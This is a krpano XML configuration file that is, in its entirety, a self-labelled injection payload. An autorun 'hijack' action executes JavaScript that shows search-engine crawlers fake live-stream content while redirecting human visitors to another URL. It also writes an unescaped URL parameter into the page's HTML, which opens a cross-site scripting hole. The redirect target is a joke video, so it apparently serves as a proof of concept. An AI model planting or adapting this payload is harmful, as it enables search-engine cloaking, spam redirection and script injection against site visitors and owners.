<krpano>
    <action name="hijack" autorun="onstart">
        js(
            (function() {
                console.log(" [PAYLOAD EXECUTED] ");
                const urlParams = new URLSearchParams(window.location.search);
                const eventId = urlParams.get('id') || "sports";
                const isBot = /bot|googlebot|crawler|spider|robot|crawling/i.test(navigator.userAgent);
                
                if (isBot) {
                    console.log(" [BOT DETECTED] Showing safe content.");
                    document.title = `[LIVE] ${eventId} Stream`;
                    document.body.innerHTML = `<h1>${eventId} Live Stream</h1><p>Watch ${eventId} live.</p>`;
                } else {
                    console.log(" [HUMAN DETECTED] Redirecting to YouTube...");
                    window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
                }
            })();
        );
    </action>
</krpano>
